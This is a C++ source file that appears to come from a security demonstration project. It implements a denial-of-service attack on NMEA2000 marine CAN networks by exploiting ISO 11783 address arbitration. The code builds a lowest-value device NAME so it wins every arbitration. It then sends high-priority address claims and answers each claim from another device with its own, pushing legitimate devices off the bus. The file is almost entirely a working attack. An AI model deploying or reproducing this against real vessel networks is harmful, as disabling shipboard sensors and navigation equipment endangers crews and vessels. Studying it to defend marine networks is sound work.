/**
 * @file Attack_Spam.cpp
 * @brief Spam/DOS attack implementation for Attack_Controller
 *
 * This file implements the ISO Address Claim spam attack, which demonstrates
 * a Denial of Service (DOS) vulnerability in NMEA2000 networks by exploiting
 * the ISO 11783 address arbitration mechanism.
 */

#include "Attack_Controller.h"
#include <Sensor.h>

/**
 * @brief Builds a high-priority NAME for address arbitration
 *
 * Constructs a 64-bit ISO NAME with the lowest possible value (highest priority)
 * to win address arbitration against legitimate devices. In NMEA2000/ISO 11783,
 * lower NAME values have higher priority during address conflicts.
 *
 * @return uint64_t The constructed high-priority NAME value
 * 
 * NAME field breakdown:
 * - Bits 0-20: Unique Number (set to 0 for lowest value)
 * - Bits 21-31: Manufacturer Code (set to 0)
 * - Bits 32-34: Device Instance (set to 0)
 * - Bits 35-42: Device Function (130 = Temperature)
 * - Bits 43-49: Device Class (75 = Sensor Communication)
 * - Bits 50-53: System Instance (set to 0)
 * - Bits 54-56: Industry Group (4 = Marine)
 * - Bit 57: Self-configurable (1 = yes)
 */
uint64_t Attack_Controller::buildHighPriorityName() {
    // Build a NAME with very low value (high priority) to win address arbitration
    // Lower NAME value = higher priority in NMEA2000/ISO 11783
    uint64_t name = 0;
    name |= ((uint64_t)0);                          // Unique number: 0 (lowest possible)
    name |= ((uint64_t)0 << 21);                    // Manufacturer code: 0 (lowest)
    name |= ((uint64_t)0 << 32);                    // Device instance: 0
    name |= ((uint64_t)130 << 35);                  // Device function: Temperature
    name |= ((uint64_t)75 << 43);                   // Device class: Sensor Communication
    name |= ((uint64_t)0 << 50);                    // System instance: 0
    name |= ((uint64_t)4 << 54);                    // Industry group: Marine
    name |= ((uint64_t)1 << 57);                    // Self-configurable: yes
    return name;
}

/**
 * @brief Checks if a source address belongs to our own device
 *
 * Compares a source address against all registered device addresses on this
 * controller to avoid attacking our own sensors.
 *
 * @param source The source address to check
 * @return true if the address belongs to one of our registered devices
 * @return false if the address is from an external device
 */
bool Attack_Controller::isOwnSource(uint8_t source) {
    // Check if source matches any of our registered device addresses
    // GetN2kSource() returns the current source address for each device index
    int deviceCount = 3;  // 3 registered devices (sensors)
    for (int i = 0; i < deviceCount; i++) {
        if (nmea2000_can1->GetN2kSource(i) == source) {
            return true;
        }
    }
    return false;
}

/**
 * @brief Sends a high-priority ISO Address Claim for a target address
 *
 * Transmits an ISO Address Claim message (PGN 60928) with our high-priority
 * NAME to claim a specific address. Uses priority 0 (highest) to ensure
 * the claim is processed before lower-priority traffic.
 *
 * @param targetAddress The address to claim (0-252)
 */
void Attack_Controller::sendHighPriorityAddressClaim(uint8_t targetAddress) {
    tN2kMsg claimMsg;

    // Use library function to set up the ISO Address Claim message
    SetN2kPGN60928(claimMsg, attackerName);

    // Override priority and source for our attack
    claimMsg.Priority = 0;  // Highest priority
    claimMsg.Source = targetAddress;

    nmea2000_can1->SendMsg(claimMsg, -1);
    spamMessageCount++;
}

/**
 * @brief Starts the spam/DOS attack
 *
 * Initiates the address takeover attack by:
 * 1. Stopping any active impersonate attack (single attack at a time)
 * 2. Building the high-priority attacker NAME
 * 3. Sending initial address claims for addresses 1-252
 * 4. Enabling reactive mode to respond to future address claims
 */
void Attack_Controller::startSpamAttack() {
    // Stop any existing impersonate attack first (enforce single attack at a time)
    if (impersonateActive) {
        stopImpersonate();
    }

    spamAttackActive = true;
    spamMessageCount = 0;
    currentSpamAddress = 0;
    lastSpamTime = 0;

    // Build our high-priority NAME once at start
    attackerName = buildHighPriorityName();

    // Clear any previously claimed addresses
    claimedAddresses.clear();
    // for(int i = 1; i< 253; i++){
    //     sendHighPriorityAddressClaim(i);
    //     delay(10);
    // }
}

/**
 * @brief Stops the spam/DOS attack
 *
 * Terminates the attack and attempts to restore normal network operation by:
 * 1. Clearing the claimed addresses set
 * 2. Re-sending address claims for our legitimate sensors
 *
 * @note After stopping, the network should gradually recover as legitimate
 * devices reclaim their addresses through normal arbitration.
 */
void Attack_Controller::stopSpamAttack() {
    spamAttackActive = false;

    // Clear claimed addresses
    claimedAddresses.clear();

    // Re-send address claims for our actual 3 sensors to restore normal operation
    // This helps reclaim the addresses after the spam attack
    nmea2000_can1->SendIsoAddressClaim(0xff, 0, 0);  // Sensor 1
    nmea2000_can1->SendIsoAddressClaim(0xff, 1, 0);  // Sensor 2
    nmea2000_can1->SendIsoAddressClaim(0xff, 2, 0);  // Sensor 3
}

/**
 * @brief Handles incoming messages during active spam attack
 *
 * Monitors the CAN bus for ISO Address Claim messages (PGN 60928) from
 * other devices and responds with our own high-priority claim to maintain
 * address dominance.
 *
 * @param N2kMsg The incoming NMEA2000 message to process
 */
void Attack_Controller::attackHandler(const tN2kMsg &N2kMsg) {
    // Only respond during active spam attack
    if (!spamAttackActive) return;

    // This means that this is our device lmao
    if(N2kMsg.Priority == 0 && N2kMsg.PGN == 60928L) return;

    if(N2kMsg.PGN == 60928L){
#if DEBUG
        Serial.println(N2kMsg.Source);
#endif
        sendHighPriorityAddressClaim(N2kMsg.Source);
    }

}
